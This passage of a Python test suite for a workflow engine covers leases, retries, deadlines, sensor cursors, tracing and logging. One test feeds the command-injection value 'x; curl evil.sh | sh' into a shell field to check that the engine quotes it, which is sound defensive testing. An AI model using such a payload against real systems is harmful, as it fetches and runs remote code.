    async with session_scope(sessions) as session:
        rows = await session.execute(
            sa.select(StepAttempt).where(StepAttempt.run_id == run.id, StepAttempt.id != unit.attempt_id)
        )
        sibling = rows.scalar_one()
        sibling.remote_handle = _handle().model_dump(mode="json")

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [unit.attempt_id]

    async with sessions() as session:
        recovered = await session.get(StepAttempt, unit.attempt_id)
        assert recovered is not None
        assert recovered.status is AttemptStatus.QUEUED
        assert recovered.remote_handle is None, "this item adopted another item's remote job"


async def test_a_live_lease_is_left_alone(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="alive", steps=steps(only=StepDefinition(block="test.echo")))
    await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    assert await engine.heartbeat([unit.attempt_id]) == {unit.attempt_id}
    async with session_scope(sessions) as session:
        assert await sweep_leases(session) == []


async def test_an_outcome_is_refused_when_the_lease_was_stolen(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The lease is a fence, not a hint: a worker whose lease was taken writes nothing."""
    definition = PipelineDefinition(code="fenced", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None

    # The sweeper decided this worker was gone and put the attempt back on the queue.
    async with session_scope(sessions) as session:
        await sweep_leases(session, now=_after_lease(services))
    async with sessions() as session:
        stolen = await session.get(StepAttempt, unit.attempt_id)
        assert stolen is not None
        assert stolen.status is AttemptStatus.QUEUED
        assert stolen.lease_owner is None

    # The original worker finishes anyway and tries to record what it produced.
    await engine.run_unit(unit)

    async with sessions() as session:
        after = await session.get(StepAttempt, unit.attempt_id)
        assert after is not None
        assert after.status is AttemptStatus.QUEUED, "the abandoned worker overwrote a requeued attempt"
        assert after.output is None
        assert after.finished_at is None
        reloaded = await session.get(Run, run.id)
        assert reloaded is not None
        assert reloaded.status is RunStatus.RUNNING


async def test_a_remote_handle_is_refused_when_the_lease_was_stolen(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The submit-window commit is fenced too, or a replay adopts a handle it does not own."""
    definition = PipelineDefinition(code="fenced-handle", steps=steps(job=StepDefinition(block="test.remote")))
    await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    async with session_scope(sessions) as session:
        await sweep_leases(session, now=_after_lease(services))

    await engine.record_handle(unit, _handle())

    async with sessions() as session:
        after = await session.get(StepAttempt, unit.attempt_id)
        assert after is not None
        assert after.remote_handle is None


async def test_stuck_runs_are_detected(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="stalled", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    async with sessions() as session:
        assert await detect_stuck_runs(session, after=timedelta(hours=1)) == []
        stuck = await detect_stuck_runs(session, after=timedelta(seconds=1), now=_after_lease(services))
    assert stuck == [run.id]


def _after_lease(services: EngineServices) -> datetime:
    """A moment far enough in the future that every lease this test took has expired."""
    return utcnow() + services.settings.lease + timedelta(minutes=1)


def _handle() -> RemoteHandle:
    """The handle the remote test operator would have recorded."""
    return RemoteHandle(block_id="test.remote", ref="job-1", meta={"result": "done"})


def test_probe_statuses_are_the_four_the_engine_handles() -> None:
    assert set(ProbeStatus) == {
        ProbeStatus.RUNNING,
        ProbeStatus.SUCCEEDED,
        ProbeStatus.FAILED,
        ProbeStatus.GONE,
    }


async def test_a_value_interpolated_into_a_shell_field_reaches_the_block_quoted(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The block declares the field as shell-parsed; the engine is what quotes into it."""
    definition = PipelineDefinition(
        code="quoted",
        steps=steps(only=StepDefinition(block="test.shellish", config={"command": "load ${params.region}"})),
    )
    run = await start(sessions, services, definition, region="x; curl evil.sh | sh")
    await drain(engine)
    attempt = (await attempts_of(sessions, run.id))[0]
    assert attempt.status is AttemptStatus.SUCCEEDED
    assert attempt.output == {"command": "load 'x; curl evil.sh | sh'"}


async def test_a_manual_retry_is_keyed_on_the_step_it_retries(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """One request id reused across a batch of retries must be one retry per step."""
    definition = PipelineDefinition(
        code="two-failures",
        steps=steps(
            left=StepDefinition(block="test.fail", config={"key": "left"}),
            right=StepDefinition(block="test.fail", config={"key": "right"}, rule=TriggerRule.ALWAYS),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        left = await retry_step(session, services, stored, "left", idempotency_key="one-batch")
        right = await retry_step(session, services, stored, "right", idempotency_key="one-batch")
    assert left.id != right.id
    assert left.step_name == "left"
    assert right.step_name == "right"


async def test_a_manual_retry_replayed_with_the_same_key_returns_the_same_attempt(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The key is a column with a unique constraint, so the guarantee is the database's."""
    definition = PipelineDefinition(code="one-failure", steps=steps(only=StepDefinition(block="test.fail")))
    run = await start(sessions, services, definition)
    await drain(engine)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        first = await retry_step(session, services, stored, "only", idempotency_key="click")
        again = await retry_step(session, services, stored, "only", idempotency_key="click")
    assert first.id == again.id

    async with sessions() as session:
        rows = await session.execute(
            sa.select(StepAttempt).where(StepAttempt.run_id == run.id, StepAttempt.kind == AttemptKind.MANUAL)
        )
        manual = list(rows.scalars())
    assert len(manual) == 1
    assert manual[0].idempotency_key == idempotency_scope("only", None, "click")


async def test_a_literal_for_each_list_resolves_the_references_inside_it(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A list is a list of values, and a value may be a reference."""
    definition = PipelineDefinition(
        code="mixed-list",
        steps=steps(
            push=StepDefinition(
                block="test.echo",
                for_each=["${params.primary}", "eu-north-1"],
                config={"value": "${item}"},
            )
        ),
    )
    run = await start(sessions, services, definition, primary="no-central-1")
    await drain(engine)

    async with sessions() as session:
        rows = await session.execute(sa.select(RunItem).where(RunItem.run_id == run.id).order_by(RunItem.item_index))
        items = list(rows.scalars())
    assert [item.item_key for item in items] == ["no-central-1", "eu-north-1"]
    assert sorted(EchoOperator.calls) == ["eu-north-1", "no-central-1"]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


# -- probe cadence ---------------------------------------------------------------


async def parked_intervals(
    engine: Engine,
    sessions: async_sessionmaker[AsyncSession],
    run_id: UUID,
    *,
    cycles: int,
) -> list[timedelta]:
    """Drive one unit at a time and report how long each cycle parked the attempt for."""
    moment = datetime.now(UTC)
    intervals: list[timedelta] = []
    for _ in range(cycles):
        unit = await engine.claim(now=moment)
        if unit is None:
            return intervals
        await engine.run_unit(unit, now=moment)
        attempt = (await attempts_of(sessions, run_id))[0]
        if attempt.status is not AttemptStatus.WAITING or attempt.next_poll_at is None:
            return intervals
        intervals.append(attempt.next_poll_at - moment)
        moment = attempt.next_poll_at
    return intervals


def test_the_probe_interval_widens_from_the_first_probe_to_the_cadence() -> None:
    cadence = timedelta(seconds=30)
    assert [probe_interval(cadence, probes) for probes in range(6)] == [
        timedelta(seconds=1),
        timedelta(seconds=2),
        timedelta(seconds=4),
        timedelta(seconds=8),
        timedelta(seconds=16),
        timedelta(seconds=30),
    ]
    assert probe_interval(cadence, 100) == cadence
    assert probe_interval(timedelta(milliseconds=200), 0) == timedelta(milliseconds=200)


async def test_a_remote_job_is_probed_within_a_second_rather_than_at_the_cadence(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A container that exits immediately must not sit parked for the block's whole cadence."""
    RemoteOperator.probes.clear()
    definition = PipelineDefinition(
        code="fast-remote",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                poll=timedelta(seconds=30),
                config={"statuses": ["running", "succeeded"], "poll_hint": None},
            )
        ),
    )
    run = await start(sessions, services, definition)
    assert await parked_intervals(engine, sessions, run.id, cycles=3) == [
        timedelta(seconds=1),
        timedelta(seconds=2),
    ]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


async def test_the_probe_backoff_stops_at_the_configured_poll(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    RemoteOperator.probes.clear()
    definition = PipelineDefinition(
        code="slow-remote",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                poll=timedelta(seconds=3),
                config={"statuses": ["running"], "poll_hint": None},
            )
        ),
    )
    run = await start(sessions, services, definition)
    assert await parked_intervals(engine, sessions, run.id, cycles=5) == [
        timedelta(seconds=1),
        timedelta(seconds=2),
        timedelta(seconds=3),
        timedelta(seconds=3),
        timedelta(seconds=3),
    ]


async def test_a_sensor_keeps_the_cadence_it_was_given(engine: Engine, sessions: Any, services: EngineServices) -> None:
    """A sensor's poll is a promise about how often the world is checked, so it is exact."""
    definition = PipelineDefinition(
        code="steady-sensor",
        steps=steps(
            gate=StepDefinition(
                block="test.tick",
                poll=timedelta(seconds=30),
                deadline=timedelta(hours=1),
                config={"ready_after": 5, "key": "cadence", "poll_hint": None},
            )
        ),
    )
    run = await start(sessions, services, definition)
    assert await parked_intervals(engine, sessions, run.id, cycles=4) == [timedelta(seconds=30)] * 4


async def test_cancelling_between_the_handle_and_the_park_still_tells_the_remote(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The handle is committed while the attempt is still running, one transaction early.

    A cancel landing in that window used to mark the attempt cancelled and say nothing to the
    remote, because only a waiting attempt was told. The job carried on.
    """
    definition = PipelineDefinition(
        code="cancel-mid-submit",
        steps=steps(
            job=StepDefinition(block="test.remote", config={"statuses": ["running"]}, poll=timedelta(minutes=5))
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    # Exactly what run_unit does between execute() and the outcome transaction.
    await engine.record_handle(unit, RemoteHandle(block_id="test.remote", ref="job-1", meta={"result": "ok"}))

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored)

    assert RemoteOperator.cancellations == ["job-1"], "the remote job was left running"
    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.CANCELLED


async def test_a_handle_arriving_after_a_cancel_is_kept_and_cancelled(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A cancel during execute() clears the lease, and the handle arrives to a cancelled row.

    Discarding it orphans the remote job and leaves nothing recording that it exists, which is
    worse than the window above: nothing can ever go and cancel it.
    """
    definition = PipelineDefinition(
        code="cancel-during-submit",
        steps=steps(
            job=StepDefinition(block="test.remote", config={"statuses": ["running"]}, poll=timedelta(minutes=5))
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored)

    await engine.record_handle(unit, RemoteHandle(block_id="test.remote", ref="job-2", meta={"result": "ok"}))

    assert RemoteOperator.cancellations == ["job-2"], "the remote job was orphaned"
    settled = (await attempts_of(sessions, run.id))[0]
    assert settled.remote_handle is not None, "and nothing recorded that it ever existed"


async def test_a_deadline_that_passes_while_waiting_is_settled_without_a_poke(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A parked attempt is not claimable, so nothing would notice its deadline until the poke.

    With a poll an hour away, the deadline is honoured an hour late, and until then a person
    watching sees a step sitting past a deadline it was given.
    """
    definition = PipelineDefinition(
        code="deadline-while-waiting",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["running"]},
                poll=timedelta(hours=1),
                deadline=timedelta(minutes=5),
                on_timeout=TimeoutAction.SKIP,
            )
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)
    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.WAITING

    async with session_scope(sessions) as session:
        settled = await engine.settle_overdue_deadlines(session, now=utcnow() + timedelta(hours=1))

    assert len(settled) == 1, "the deadline was not noticed until the next poke"
    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.SKIPPED


async def test_a_deadline_that_settles_the_active_run_releases_the_queue(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """Settling a deadline ends a run, so it owes the alerts and the slot every ending owes."""
    definition = PipelineDefinition(
        code="deadline-then-queue",
        concurrency=ConcurrencyPolicy.QUEUE,
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["running"]},
                poll=timedelta(hours=1),
                deadline=timedelta(minutes=5),
                on_timeout=TimeoutAction.FAIL,
            )
        ),
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        session.add(AlertRule(code="failures", event=AlertEvent.RUN_FAILED, notifier="recording"))
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
    assert first is not None and second is not None
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)

    async with session_scope(sessions) as session:
        assert len(await engine.settle_overdue_deadlines(session, now=utcnow() + timedelta(hours=1))) == 1

    assert (await reload(sessions, first.id)).status is RunStatus.FAILED
    assert (await statuses(sessions, second.id))["job"] == [AttemptStatus.QUEUED]
    released = await engine.claim()
    assert released is not None and released.run_id == second.id, "the queue stalled behind a settled deadline"

    async with sessions() as session:
        rows = await session.execute(sa.select(Notification).where(Notification.run_id == first.id))
        assert len(list(rows.scalars())) == 1, "a run that failed on its deadline raised no alert"


async def test_a_deadline_still_ahead_is_left_alone(engine: Engine, sessions: Any, services: EngineServices) -> None:
    """A sweep that settled a step still inside its deadline would end runs early."""
    definition = PipelineDefinition(
        code="deadline-ahead",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["running"]},
                poll=timedelta(minutes=1),
                deadline=timedelta(hours=2),
            )
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)

    async with session_scope(sessions) as session:
        assert await engine.settle_overdue_deadlines(session) == []

    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.WAITING


async def test_a_passed_deadline_fails_the_step_when_that_is_what_was_asked_for(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """on_timeout is configuration, and the sweep honours it exactly as the claim path does."""
    definition = PipelineDefinition(
        code="deadline-fails",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["running"]},
                poll=timedelta(hours=1),
                deadline=timedelta(minutes=5),
                on_timeout=TimeoutAction.FAIL,
            )
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)

    async with session_scope(sessions) as session:
        assert len(await engine.settle_overdue_deadlines(session, now=utcnow() + timedelta(hours=1))) == 1

    settled = (await attempts_of(sessions, run.id))[0]
    assert settled.status is AttemptStatus.FAILED
    assert "deadline" in (settled.error or "")


async def test_a_run_and_every_attempt_of_it_land_in_one_trace(
    engine: Engine, sessions: Any, services: EngineServices, spans: InMemorySpanExporter
) -> None:
    """An attempt is claimed by a worker that shares nothing with the caller but the row."""
    definition = PipelineDefinition(
        code="traced",
        steps=steps(
            first=StepDefinition(block="test.echo"),
            second=StepDefinition(block="test.echo", depends_on=["first"]),
        ),
    )
    await start(sessions, services, definition)
    await drain(engine)

    finished = spans.get_finished_spans()
    root = next(span for span in finished if span.name == "run traced")
    attempts = [span for span in finished if span.name.startswith("step ")]

    assert len(attempts) == 2
    assert root.context is not None
    for span in attempts:
        assert span.context is not None
        assert span.context.trace_id == root.context.trace_id, f"{span.name} started a trace of its own"
        assert span.parent is not None
        assert span.parent.span_id == root.context.span_id, f"{span.name} hangs from nothing"


async def test_a_run_created_with_no_exporter_carries_no_trace_context(sessions: Any, services: EngineServices) -> None:
    """A no-op span's all-zero ids name a trace that does not exist, so nothing is stored."""
    definition = PipelineDefinition(code="untraced", steps=steps(only=StepDefinition(block="test.echo")))

    run = await start(sessions, services, definition)

    assert run.traceparent is None


async def test_a_worker_that_dies_after_fetching_fetches_again_and_settles_once(
    engine: Engine, sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Fetch is at-least-once: the outcome commit is the only thing that ends an attempt.

    A worker that has fetched and then dies leaves the attempt waiting with its handle, so
    the next claim probes and fetches again. What must not happen twice is the settling.
    """
    definition = PipelineDefinition(
        code="crashed-after-fetch",
        steps=steps(job=StepDefinition(block="test.remote", poll=timedelta(seconds=1))),
    )
    run = await start(sessions, services, definition)
    submit = await engine.claim()
    assert submit is not None
    await engine.run_unit(submit)

    async def die(*_: object, **__: object) -> None:
        raise RuntimeError("the worker died between fetching and recording the outcome")

    monkeypatch.setattr(Engine, "_record", die)
    probe = await engine.claim(now=utcnow() + timedelta(seconds=2))
    assert probe is not None
    with pytest.raises(RuntimeError):
        await engine.run_unit(probe)
    assert RemoteOperator.fetches == ["job-1"], "the result was fetched, and the outcome was lost"
    monkeypatch.undo()

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [probe.attempt_id]
    await drain(engine, start_at=_after_lease(services), step=timedelta(seconds=2))

    assert RemoteOperator.submissions == ["job-1"], "the work went out twice"
    assert RemoteOperator.fetches == ["job-1", "job-1"], "the result was not fetched again"
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    settled = [attempt for attempt in await attempts_of(sessions, run.id) if attempt.finished_at is not None]
    assert len(settled) == 1, "one attempt settled once, however many times it was fetched"
    assert settled[0].output == {"ref": "job-1", "result": "done"}


# -- a sensor's cursor -----------------------------------------------------------


def sensing(**config: Any) -> PipelineDefinition:
    """A one-step pipeline whose sensor reads a notional stream by offset."""
    return PipelineDefinition(
        code="cursor-sensor",
        steps=steps(wait=StepDefinition(block="test.cursor", config=config, poll=timedelta(seconds=1))),
    )


async def test_the_first_poke_of_a_sensor_is_handed_no_cursor(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    await start(sessions, services, sensing(need=0))
    await drain(engine, step=timedelta(seconds=2))

    assert CursorSensor.seen["default"] == [None]


async def test_a_poke_that_advances_the_cursor_hands_it_to_the_next_poke(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    await start(sessions, services, sensing(need=10, batch=5))
    await drain(engine, step=timedelta(seconds=2))

    assert CursorSensor.seen["default"] == [None, {"offset": 5}, {"offset": 10}]


async def test_a_poke_that_advances_nothing_leaves_the_cursor_as_it_was(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    await start(sessions, services, sensing(need=10, batch=5, advances=1))
    await cycles(engine, 4)

    assert CursorSensor.seen["default"] == [None, {"offset": 5}, {"offset": 5}, {"offset": 5}]


async def test_an_advance_replaces_the_cursor_rather_than_merging_it(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A sensor author copies forward whatever it keeps, so a dropped key is gone."""
    await start(sessions, services, sensing(need=10, batch=5, extra={"epoch": 1}))
    await drain(engine, step=timedelta(seconds=2))

    assert CursorSensor.seen["default"] == [None, {"offset": 5, "epoch": 1}, {"offset": 10}]


async def test_the_cursor_a_poke_returned_is_stored_on_the_parked_attempt(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    run = await start(sessions, services, sensing(need=10, batch=5))
    await cycles(engine, 1)

    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.WAITING
    assert attempts[0].poke_cursor == {"offset": 5}


async def test_a_cursor_is_not_carried_past_the_poke_that_succeeded(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The cursor's life is the waiting attempt; what a later step needs is in the output."""
    run = await start(sessions, services, sensing(need=5, batch=5))
    await drain(engine, step=timedelta(seconds=2))

    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.SUCCEEDED
    assert attempts[0].output == {"cursor": {"offset": 5}}


async def test_a_worker_that_dies_between_pokes_pokes_again_from_the_last_committed_cursor(
    engine: Engine, sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Advancing is at-least-once, so a poke reads the same ground twice rather than skipping it."""
    run = await start(sessions, services, sensing(need=15, batch=5))
    await cycles(engine, 1)

    async def die(*_: object, **__: object) -> None:
        raise RuntimeError("the worker died between poking and recording the outcome")

    monkeypatch.setattr(Engine, "_record", die)
    lost = await engine.claim(now=utcnow() + timedelta(seconds=2))
    assert lost is not None
    with pytest.raises(RuntimeError):
        await engine.run_unit(lost)
    monkeypatch.undo()
    assert CursorSensor.seen["default"] == [None, {"offset": 5}], "the second poke read from the stored cursor"

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [lost.attempt_id]
    await drain(engine, start_at=_after_lease(services), step=timedelta(seconds=2))

    assert CursorSensor.seen["default"] == [
        None,
        {"offset": 5},
        {"offset": 5},
        {"offset": 10},
        {"offset": 15},
    ], "the lost advance was made again rather than skipped"
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


# -- what a wait is seeing -------------------------------------------------------


async def logs_of(sessions: async_sessionmaker[AsyncSession], run_id: UUID) -> list[LogEntry]:
    """Read every log entry of a run, oldest first."""
    async with sessions() as session:
        rows = await session.execute(sa.select(LogEntry).where(LogEntry.run_id == run_id).order_by(LogEntry.id))
        return list(rows.scalars())


async def test_a_waiting_sensor_says_what_it_is_seeing(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="watching",
        steps=steps(
            wait=StepDefinition(
                block="test.tick",
                config={"ready_after": 2, "says": ["one file of three", "two files of three"]},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    first = await engine.claim()
    assert first is not None
    await engine.run_unit(first)

    waiting = (await attempts_of(sessions, run.id))[0]
    assert waiting.status is AttemptStatus.WAITING
    assert waiting.waiting_message == "one file of three"
    assert waiting.waiting_progress == pytest.approx(1 / 3)

    await drain(engine, start_at=utcnow() + timedelta(seconds=2), step=timedelta(seconds=2))

    settled = (await attempts_of(sessions, run.id))[0]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert settled.status is AttemptStatus.SUCCEEDED
    assert settled.waiting_message is None, "a succeeded attempt is not seeing anything"
    assert settled.waiting_progress is None

    entries = await logs_of(sessions, run.id)
    assert [entry.message for entry in entries] == ["one file of three", "two files of three", "finished"]
    assert {entry.step_attempt_id for entry in entries} == {settled.id}
    assert {entry.step_name for entry in entries} == {"wait"}


async def test_the_same_sight_is_logged_once(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="unchanging",
        steps=steps(
            wait=StepDefinition(
                block="test.tick",
                config={"ready_after": 2, "says": ["still empty"]},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["still empty", "finished"]


async def test_a_running_probe_reports_progress_the_same_way(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="building",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={
                    "statuses": ["running", "succeeded"],
                    "says": "the remote is building",
                    "shows": 0.4,
                },
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    submit = await engine.claim()
    assert submit is not None
    await engine.run_unit(submit)

    moment = utcnow() + timedelta(seconds=2)
    probe = await engine.claim(now=moment)
    assert probe is not None
    await engine.run_unit(probe, now=moment)

    waiting = (await attempts_of(sessions, run.id))[0]
    assert waiting.status is AttemptStatus.WAITING
    assert waiting.waiting_message == "the remote is building"
    assert waiting.waiting_progress == pytest.approx(0.4)

    await drain(engine, start_at=moment + timedelta(seconds=2), step=timedelta(seconds=2))

    settled = (await attempts_of(sessions, run.id))[0]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert settled.waiting_message is None
    assert settled.waiting_progress is None
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["the remote is building", "finished"]


# -- what an attempt leaves behind -----------------------------------------------


async def test_an_attempt_that_logged_nothing_of_its_own_leaves_a_trace(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """An engine-side step writes no stream of its own, so the engine says that it settled."""
    definition = PipelineDefinition(
        code="quiet",
        steps=steps(only=StepDefinition(block="transform.upper", config={"program": "upper", "input": "hush"})),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    settled = (await attempts_of(sessions, run.id))[0]
    entries = await logs_of(sessions, run.id)
    assert [entry.message for entry in entries] == ["finished"]
    assert entries[0].level is LogLevel.INFO
    assert entries[0].step_name == "only"
    assert entries[0].step_attempt_id == settled.id
    assert entries[0].fields is not None
    assert entries[0].fields["output_bytes"] == len(canonical_json(settled.output))
    assert isinstance(entries[0].fields["duration_ms"], int)


async def test_a_failed_attempt_traces_its_error_beside_the_class(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A log is read on its own -- piped, downloaded, tomorrow -- so the line says what failed."""
    definition = PipelineDefinition(
        code="broken",
        steps=steps(
            only=StepDefinition(
                block="test.fail",
                config={"message": "the file was not there", "error_class": "rejected", "key": "traced"},
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    settled = (await attempts_of(sessions, run.id))[0]
    entries = await logs_of(sessions, run.id)
    assert [entry.message for entry in entries] == ["failed"]
    assert entries[0].level is LogLevel.ERROR
    assert entries[0].fields is not None
    assert entries[0].fields["error_class"] == ErrorClass.REJECTED.value
    assert entries[0].fields["error"] == "the file was not there"
    assert isinstance(entries[0].fields["duration_ms"], int)
    assert "output_bytes" not in entries[0].fields
    assert settled.error == "the file was not there"


async def test_a_block_that_kept_its_own_account_is_not_told_it_finished_twice(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(code="talkative", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    await drain(engine)

    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["echoing"]


async def test_a_sensor_traces_the_settlement_rather_than_every_poke(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A sensor poked once a second for an hour is one line, not thirty-six hundred."""
    definition = PipelineDefinition(
        code="patient",
        steps=steps(
            wait=StepDefinition(
                block="test.tick",
                config={"ready_after": 3, "key": "traced"},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    settled = (await attempts_of(sessions, run.id))[0]
    assert settled.status is AttemptStatus.SUCCEEDED
    assert settled.poke_count == 3, "the sensor was poked more than once before it settled"
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["finished"]


# -- output persistence ----------------------------------------------------------


class _MarkedFileBackend(FileStorageBackend):
    """A ``file://`` backend that records which instance of itself each write went through."""

    def __init__(self, root: str | Path, writes: list[str], *, source: str = "default") -> None:
        """Bind the backend to its root, the shared record of writes, and how it was reached."""
        super().__init__(root)
        self.writes = writes
        self.source = source

    def configured(self, config: BaseModel) -> "_MarkedFileBackend":
        """Return the instance the coded connection configures, rooted where it says."""
        return _MarkedFileBackend(cast(FileStorageConfig, config).root, self.writes, source="connection")

    def open_write(self, uri: str) -> AbstractAsyncContextManager[ByteSink]:
        """Note which instance is writing, then write."""
        self.writes.append(self.source)
        return super().open_write(uri)


async def test_an_output_too_large_to_inline_is_persisted_through_the_configured_connection(
    sessions: Any, settings: Settings, host: PluginHost
) -> None:
    """A step's own writes go through its configured backend, and so must its output."""
    root = parse_uri(settings.artifact_root)[1]
    writes: list[str] = []
    tuned = settings.model_copy(update={"inline_artifact_max": 16, "storage_connections": {"file": "artifacts"}})
    services = EngineServices(
        settings=tuned,
        host=host,
        storage=Storage({"file": _MarkedFileBackend(root, writes)}, tuned.artifact_root),
        secrets=SecretBox(tuned.secret_key.get_secret_value() if tuned.secret_key else None),
    )
    engine = Engine(sessions, services, owner="worker-under-test")
    async with session_scope(sessions) as session:
        session.add(Connection(code="artifacts", kind="test.files", config={"root": root}))

    definition = PipelineDefinition(
        code="big-output",
        steps=steps(only=StepDefinition(block="test.echo", config={"value": "x" * 200})),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    settled = (await attempts_of(sessions, run.id))[0]
    assert settled.status is AttemptStatus.SUCCEEDED
    async with sessions() as session:
        stored = await session.get(ArtifactRef, settled.output_artifact_id)
        assert stored is not None
        assert stored.uri is not None, "the output was small enough to inline, so nothing was persisted"
    assert writes == ["connection"], "the output was persisted through the unconfigured default backend"
